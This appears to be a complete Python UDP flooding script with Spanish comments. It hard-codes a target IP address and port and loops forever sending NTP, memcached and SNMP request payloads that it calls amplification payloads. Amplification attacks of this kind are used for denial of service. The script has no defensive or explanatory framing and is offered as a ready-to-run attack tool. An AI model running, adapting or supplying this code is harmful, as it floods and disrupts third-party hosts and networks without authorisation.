import socket

target_ip = "147.185.221.16"
target_port = 26544  # Cambia al puerto que desees

# Ejemplo de payloads de amplificación
ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
memcache_payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
snmp_payload = b'\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x70\xa7\xa7\x7e\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05+\x06\x01\x02\x01\x05\x00'
payloads = [ntp_payload, memcache_payload, snmp_payload]

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
    while True:
        for payload in payloads:
            sock.sendto(payload, (target_ip, target_port))
        # Puedes agregar un pequeño delay si quieres limitar la velocidad
        # time.sleep(0.001)
except KeyboardInterrupt:
    print("\nEnvío detenido por el usuario.")
finally:
    sock.close()
